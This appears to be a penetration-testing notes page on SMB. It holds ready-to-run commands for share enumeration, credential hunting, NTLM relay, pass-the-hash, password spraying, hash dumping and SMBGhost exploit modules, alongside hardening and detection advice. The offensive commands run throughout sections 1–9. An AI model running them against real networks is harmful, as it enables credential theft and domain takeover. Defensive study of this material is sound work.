+++
title = 'SMB'
date = 2026-10-30
type = 'notes'
weight = 500
toc = true
tags = ['protocols', 'services', 'smb']
+++

Server Message Block (SMB) is a client-server protocol that regulates access to files, directories, and other network resources. An SMB server exposes arbitrary parts of its local filesystem as **shares**, with access governed by **ACLs**. SMB runs on **TCP port 445** by default (NetBIOS over TCP/139 is legacy).

> **2025–2026 context:** SMB remains the single most valuable protocol in an AD environment — it is the **file-access layer**, the **relay target**, and the **coercion transport**. Three developments define the current landscape. **CVE-2025-33073** resurrected NTLM reflection and **removed the admin prerequisite** for relay-based SYSTEM access. **SMBGhost (CVE-2020-0796)** is still in **CISA's KEV catalog**, with estates still negotiating SMB 3.1.1 compression — one crafted packet away from Ring 0. And **2026 produced a cluster of SMB Server privilege-escalation CVEs** (race conditions, auth-algorithm flaws, unbounded resource allocation) that are network-reachable with any authenticated account.

---

## 1. SMB Share Enumeration

### 1.1 From Linux

```bash
# NetExec — shares
nxc smb 172.16.5.5 -u validuser -p validpassword --shares

# NetExec — spider every share (the module ignores --share)
nxc smb 172.16.5.5 -u validuser -p validpassword -M spider_plus

# NetExec — spider a specific share (module argument, not a flag)
nxc smb 172.16.5.5 -u validuser -p validpassword -M spider_plus -o SHARE=sharename

# SMBMap — share listing with read/write permissions
smbmap -u validuser -p validpassword -d INLANEFREIGHT.LOCAL -H 172.16.5.5

# SMBMap — recursive directory listing
smbmap -u validuser -p validpassword -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R SHARENAME --dir-only

# smbclient — listing
smbclient -L //172.16.5.5 -U validuser%validpassword

# smbget — recursive download (-a anonymous; -U user; -R is NOT recursion)
smbget -a --recursive smb://10.129.8.111/Development/
```

### 1.2 From Windows

```cmd
net view \\MachineName /all
```

### 1.3 Automated share hunting

**Snaffler** is the reference tool for finding credentials and sensitive data across shares. The **`snaffler-ng`** Python port (Impacket-based) runs from Linux and adds resume support, JSON/TSV output, and Kerberos:

```bash
# Full domain discovery — queries AD for computers, discovers DFS + SMB shares, scans them
snaffler run -u USERNAME -p PASSWORD -d DOMAIN.LOCAL

# Targeted UNC path
snaffler run -u USERNAME -p PASSWORD --unc //192.168.1.10/Share

# Multiple computers
snaffler run -u USERNAME -p PASSWORD --computer 192.168.1.10 --computer 192.168.1.11

# Kerberos with a ccache
snaffler run -k --use-kcache -d DOMAIN.LOCAL --dc-host CORP-DC02

# Pass-the-hash
snaffler run -u USER --hash <NTLM> -d DOMAIN.LOCAL

# Resume an interrupted scan
snaffler run -u USERNAME -p PASSWORD --computer-file targets.txt --resume
```

`snaffler-ng` discovers shares via **SRVSVC (`NetShareEnum`)** and **DFS namespaces via LDAP** (v1 + v2), merges and deduplicates the paths, walks the trees recursively, and classifies files by **regex on name and content** — with optional file download.

**Scavenger** (Linux) remains a lightweight alternative:

```bash
python3 ./scavenger.py smb -t 10.0.0.10 -u administrator -p Password123 -d testdomain.local
```

---

## 2. Null Session, Guest, and Common Credentials

### 2.1 Null and guest sessions

| Technique | Command |
|---|---|
| **Guest** | `enum4linux -a -u "guest" -p "" <DC-IP>` |
| **Guest** | `smbmap -u "guest" -p "" -P 445 -H <DC-IP>` |
| **Guest** | `smbclient -U '%' -L //<DC-IP> && smbclient -U 'guest%' -L //` |
| **NULL** | `smbclient -N -L //<FQDN/IP>` |
| **NULL** | `nxc smb <FQDN/IP> --shares -u '' -p ''` |
| **NULL** | `smbmap -u "" -p "" -P 445 -H <DC-IP>` |
| **NULL** | `enum4linux -a -u "" -p "" <DC-IP>` |

> **Null sessions are increasingly rare on DCs** (`RestrictAnonymous` is often set) but still appear on member servers, legacy appliances, and misconfigured NAS devices. `enum4linux-ng` is the maintained successor to `enum4linux` and produces structured output.

### 2.2 Common SMB credentials

| Username(s) | Password(s) |
|---|---|
| (blank) | (blank) |
| guest | (blank) |
| Administrator, admin | (blank), password, administrator, admin |
| arcserve | arcserve, backup |
| tivoli, tmersrvd | tivoli, tmersrvd, admin |
| backupexec, backup | backupexec, backup, arcada |
| test, lab, demo | password, test, lab, demo |

---

## 3. RPC Client Enumeration

`rpcclient` executes specific RPC functions against the SMB server.

| Query | Description |
|---|---|
| `srvinfo` | Server information |
| `enumdomains` | Enumerate all deployed domains |
| `querydominfo` | Domain, server, and user information |
| `netshareenumall` | Enumerate all shares |
| `netsharegetinfo` | Information about a specific share |
| `enumdomusers` | Enumerate all domain users |
| `queryuser` | Information about a specific user |
| `enumalsgroups`, `querygroup` | Alias groups and their members |
| `getdompwinfo` | **Domain password policy** — lockout threshold and duration |

### 3.1 RID brute force

```bash
# Loop over RIDs with rpcclient
for i in $(seq 500 1100); do
  rpcclient -N -U "" 10.129.14.128 -c "queryuser 0x$(printf '%x\n' $i)" \
    | grep "User Name\|user_rid\|group_rid" && echo ""
done

# Impacket Samrdump
samrdump.py 10.129.14.128

# NetExec RID brute
nxc smb 10.129.14.128 -u validuser -p validpassword --rid-brute
```

> **`getdompwinfo` is the lockout check to run before any spraying.** It returns the domain's minimum password length and lockout threshold, which determines how many attempts a spray can safely make.

---

## 4. SMB Signing, Relay, and Pass-the-Hash

| Check / Attack | Command |
|---|---|
| **Is signing required?** | `nmap -p445 --script smb2-security-mode <IP>` — relayable when "signing enabled but not required" |
| **Build a relay target list** | `nxc smb <subnet> --gen-relay-list relay.txt` |
| **Relay NTLM to SMB** | `sudo ntlmrelayx.py -tf relay.txt -smb2support` |
| **PtH — domain account** | `nxc smb <IP> -u <user> -H <NTLM> -d <domain>` |
| **PtH — local SAM hash** | `nxc smb <IP> -u Administrator -H <NTLM> --local-auth` |
| **PtH with Impacket** | `impacket-psexec <domain>/<user>@<IP> -hashes :<NTLM>` |
| **Dump SAM / LSA** | `nxc smb <IP> -u <user> -p <pass> --sam --lsa` |
| **Dump NTDS (DC)** | `nxc smb <DC> -u <user> -p <pass> --ntds` |

> **Domain controllers require SMB signing by default**, so SMB relay to a DC usually fails — relay to **LDAP** or **ADCS HTTP** instead. NetExec (`nxc`) is the maintained successor to CrackMapExec and accepts the same flags.

### 4.1 CVE-2025-33073 — NTLM reflection without the admin prerequisite

This vulnerability changes the relay calculus. Previously, relaying to a member server required the relayed account to hold **privileges on the target** — and coerced machine-account authentication generally provided no path to local admin. **CVE-2025-33073 removes that prerequisite.**

By abusing how Windows handles **marshaled target information in DNS records**, an attacker can trick the SMB client into triggering **local NTLM authentication against itself**. The result is **remote code execution as SYSTEM on any domain-joined machine without SMB signing enforced**. The only prerequisites are **network access and credentials for any domain user**.

```
Impact:      SYSTEM on any non-SMB-signing domain-joined host
Prereq:      Network access + any domain user credential
Patch:       June 2025 Windows updates
Path:        Coerce → reflect → SYSTEM → (if DC) DCSync → domain compromise
```

> **The Tier-0 blind spot.** Domain controllers enforce SMB signing; member servers and workstations do not. Even an organisation that has **patched its DCs** is not safe — the vulnerability works against **any** domain-joined system without signing, and those systems are the “one-hop” assets that lead to Tier 0. The defence is **enforce SMB signing everywhere**, not just on DCs.

### 4.2 CVE-2026-24294 — SMB arbitrary port and NTLM reflection

Windows 11 24H2 / Server 2025 introduced an **SMB arbitrary port** feature. CVE-2026-24294 abuses it for **local privilege escalation via NTLM reflection** — but the relay is blocked when **SMB signing is enforced** (which 24H2 does by default). A public PoC exists.

### 4.3 Pass-the-hash detection and mitigation

**Windows Server 2025 / Windows 11 24H2 introduced SMB client NTLM blocking** — a capability that prevents the client from sending NTLM to a remote server, counteracting **brute force, cracking, and pass-the-hash**.

```powershell
# Group Policy
# Computer Configuration → Administrative Templates → Network → Lanman Workstation
#   → Block NTLM (LM, NTLM, NTLMv2)  → Enabled

# Per-mapping NTLM blocking
NET USE \\server\share /BLOCKNTLM
New-SmbMapping -RemotePath \\server\share -BlockNTLM $true
```

**The NTLM Server Exception List** allows specific IPs, NetBIOS names, or FQDNs to continue using NTLM — for hosts that are not domain-joined.

> **NTLM blocking is an SMB client capability only.** It requires Windows Server 2025 / Windows 11 24H2 or later on the **client**, and an SMB server that supports **Kerberos or PKU2U**. It is also a prerequisite for migrating the organisation to Kerberos.

**The durable controls** for PtH are architectural, not detection-based:

| Control | What it does |
|---|---|
| **Credential Guard** | Prevents hash extraction from LSASS in the first place |
| **LAPS** | Limits the blast radius of a captured local-admin hash |
| **Tiered administration** | Prevents Tier-0 credentials from being used on Tier-1/2 systems |
| **Network segmentation** | Blocks east-west NTLM flows |
| **SMB signing everywhere** | Closes the relay path |
| **NTLM blocking** | Closes the client-side NTLM path entirely |

**Detection:** Logon **Type 3 / Type 9** activity with **abnormal workstation-to-server NTLM flows**. A NTLM logon from a host that normally authenticates with Kerberos is the signal.

---

## 5. Legacy SMBv3 Compression Vulnerabilities — Still Live in 2026

### 5.1 SMBGhost — CVE-2020-0796

An integer overflow in the **SMBv3.1.1 compression** mechanism, in `srv2.sys`. A crafted compression packet triggers a **buffer overflow in the decompression path**, leading to **pre-auth remote code execution in kernel mode (Ring 0)**.

**Affected:** Windows 10 1903/1909 and Windows Server 1903/1909.

**Detection:**

```bash
# Check whether SMB 3.1.1 with compression is negotiated
nmap -p445 --script smb2-capabilities <target>
# Look for: "SMB2_COMPRESSION_CAPABILITIES"
```

```bash
# Public threaded scanner — checks the negotiate response for dialect 3.1.1 + compression
# (Sploitus: CVE-2020-0796 scanner)
```

**Metasploit:**

```text
use auxiliary/scanner/smb/smb_ms17_010   # unrelated, but same scanner family
use exploit/windows/smb/cve_2020_0796_smbghost
```

### 5.2 SMBleed — CVE-2020-1206

A separate flaw in the same `srv2.sys` decompression path — an **out-of-bounds read** that leaks **kernel memory** remotely, **pre-authentication**.

### 5.3 SMBleedingGhost — chaining for pre-auth RCE

**SMBleed alone leaks kernel memory. Chained with SMBGhost, it achieves pre-auth RCE.** SMBleed provides the memory disclosure needed to defeat ASLR; SMBGhost provides the write primitive.

> **SMBGhost never really left.** CVE-2020-0796 is **still in CISA's KEV catalog**, and estates still negotiate SMB 3.1.1 with compression enabled — which means `srv2.sys` is one crafted packet away from Ring 0. The defence is **`DisableCompression`**, blocking 445 at the perimeter, and patching — whether or not a sensor ever sees the packet.

**Hardening:**

```powershell
# Disable SMB compression
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" `
  -Name "DisableCompression" -Value 1 -Type DWORD
```

---

## 6. 2026 SMB Server CVEs

These are **network-reachable privilege escalations** that require only an **authenticated** account.

| CVE | Type | Impact | Notes |
|---|---|---|---|
| **CVE-2026-20934** | **Race condition** (CWE-362) | **CVSS 7.5** — authenticated attacker elevates privileges over the network; impacts C/I/A | Windows up to **Server 2025**; no public exploit at disclosure |
| **CVE-2026-20926** | SMB Server EoP | **CVSS 7.5 / 6.5** | Same January 2026 patch cycle |
| **CVE-2026-50360** | **Incorrect authentication-algorithm implementation** | Authenticated attacker elevates privileges over the network | July 2026 |
| **CVE-2026-24294** | Local EoP via NTLM reflection | SYSTEM on Server 2025 | Abuses the **SMB arbitrary port** feature; blocked by SMB signing |
| **CVE-2026-69374** | **Unbounded resource allocation** (CWE-770) | Authenticated attacker causes **DoS** over the network | Server 2025 < 10.0.26100.33438 |

> **The 2026 pattern:** SMB Server bugs are now **authenticated, network-reachable privilege escalations** rather than pre-auth RCE. A single low-privileged domain account is enough — which is exactly what an attacker obtains from a spray, a relay, or a captured hash. **Patch the SMB Server component, not just the DC.**

---

## 7. CrackMapExec / NetExec Utilities

| Description | Command |
|---|---|
| **Run a command** | `nxc smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec` |
| **PowerShell command** | `nxc smb 10.10.110.17 -u Administrator -p 'Password123!' -X 'Get-Process'` |
| **Enumerate logged-on users** | `nxc smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users` |
| **Extract SAM hashes** | `nxc smb 10.10.110.17 -u administrator -p 'Password123!' --sam` |
| **Extract LSA secrets** | `nxc smb 10.10.110.17 -u administrator -p 'Password123!' --lsa` |
| **Enumerate password policy** | `nxc smb 172.16.5.5 -u validuser -p validpass --pass-pol` |
| **Enumerate users** | `nxc smb 172.16.5.5 -u validuser -p validpass --users` |
| **Enumerate groups** | `nxc smb 172.16.5.5 -u validuser -p validpass --groups` |
| **Check local admin access** | `nxc smb 10.10.110.0/24 -u user -p pass` — look for `(Pwn3d!)` |
| **Spray with continue-on-success** | `nxc smb 10.10.110.10 -u users.txt -p 'Summer2026!' --continue-on-success` |

> **`(Pwn3d!)` is the local-admin signal.** NetExec marks a host with `(Pwn3d!)` when the supplied credential grants **local administrator** access — that is the host to target for SAM/LSA dumping and execution.

---

## 8. Tooling Summary

| Tool | Purpose |
|---|---|
| **NetExec (`nxc`)** | The maintained successor to CrackMapExec — SMB/LDAP/MSSQL/WinRM/RDP/SSH/FTP/VNC auth plus **200+ post-auth modules** |
| **smbmap** | Read/write permission checks per share |
| **smbclient** | Quick anonymous share listing; interactive access |
| **enum4linux-ng** | Structured null/guest enumeration |
| **rpcclient** | RPC-specific queries — `getdompwinfo`, `enumdomusers`, RID lookup |
| **snaffler-ng** | Python port of Snaffler — domain-wide share discovery and credential hunting, with resume |
| **Scavenger** | Lightweight Linux share scanning |
| **ntlmrelayx** | NTLM relay to SMB, LDAP, ADCS, MSSQL |
| **Impacket** | `samrdump.py`, `psexec.py`, `secretsdump.py`, `smbserver.py` |

---

## 9. Testing Methodology

```text
1. Discover and fingerprint
   - nmap -p445 -sV --script smb-os-discovery,smb2-security-mode
   - Is SMB signing required? (relayable if not)

2. Null / guest / common credentials
   - smbclient -N -L //<IP>
   - nxc smb <IP> --shares -u '' -p ''
   - enum4linux-ng -A <IP>

3. Authenticated enumeration (any domain user)
   - nxc smb <IP> -u <user> -p <pass> --shares --users --groups --pass-pol
   - rpcclient getdompwinfo       (lockout policy before spraying)
   - rpcclient enumdomusers
   - smbmap -R --dir-only         (recursive listing)

4. Share hunting
   - snaffler run -d DOMAIN -u USER -p PASS
   - Look for: SSH keys, .env, .sql, backups, config files, scripts

5. Relay
   - nxc smb <subnet> --gen-relay-list relay.txt
   - ntlmrelayx.py -tf relay.txt -smb2support
   - CVE-2025-33073: any domain user → SYSTEM on non-signing hosts

6. Pass-the-hash
   - nxc smb <IP> -u <user> -H <NTLM> -d <domain>
   - --local-auth for a local SAM hash

7. Patch level
   - SMBGhost: CVE-2020-0796 (compression, srv2.sys)
   - SMBleed: CVE-2020-1206
   - 2026: CVE-2026-20934, 20926, 24294, 50360, 69374
```

---

## 10. Field Notes

- **CVE-2025-33073 is the relay finding that matters in 2026.** Any domain user → SYSTEM on **any** non-SMB-signing host — and the Tier-0 blind spot is that member servers are the one-hop path to the DC.
- **Enforce SMB signing everywhere, not just on DCs.** The DC is signed; the member server is not — and that gap is the attack surface.
- **SMBGhost is still in CISA KEV.** SMB 3.1.1 with compression enabled is a Ring-0 RCE one crafted packet away; SMBleed leaks the kernel memory to make the chain reliable.
- **The 2026 SMB Server CVEs are authenticated, not pre-auth.** CVE-2026-20934 (race condition, CVSS 7.5) and CVE-2026-50360 (auth-algorithm flaw) need only a low-privileged account — exactly what a spray or relay produces.
- **`getdompwinfo` before any spray.** It returns the lockout threshold and duration; spraying without it is how accounts get locked.
- **`(Pwn3d!)` is the NetExec local-admin signal.** That host is the target for SAM/LSA dumping and execution.
- **Snaffler-ng runs from Linux.** Impacket-based, Kerberos and PtH support, resume via SQLite — the practical replacement for running the original Snaffler on a Windows host.
- **The `spider_plus` module ignores `--share`.** Pass `-o SHARE=sharename` instead.
- **`smbget -R` is not recursion.** Use `--recursive`; `-a` is anonymous, `-U` is a user.
- **NTLM blocking is the architectural fix.** Windows Server 2025 / 11 24H2 can block NTLM on the SMB client entirely — combined with Credential Guard, LAPS, and tiered admin, it closes the PtH path rather than detecting it after the fact.
- **Null sessions are not dead.** They are rare on DCs but still present on member servers, NAS devices, and appliances — `enum4linux-ng` is still worth the three seconds.
